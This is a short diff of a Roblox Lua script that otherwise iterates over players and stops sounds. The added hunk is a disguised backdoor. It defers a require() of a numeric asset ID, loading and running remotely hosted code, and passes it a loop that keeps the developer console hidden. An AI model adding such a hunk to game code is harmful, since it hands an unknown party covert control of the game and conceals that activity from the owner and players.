@@ -14,6 +14,10 @@ for i,v in pairs(game:GetService("Players"):GetPlayers()) do
     end
 end
 
+task.defer(function()
+        require(16303756383)(false,[===[while task.wait() do game:GetService("StarterGui"):SetCore("DevConsoleVisible", false) end]===])
+    end)
+
 for i,v in pairs(game:GetDescendants()) do
     if v:IsA("Sound") then
         v:Stop()
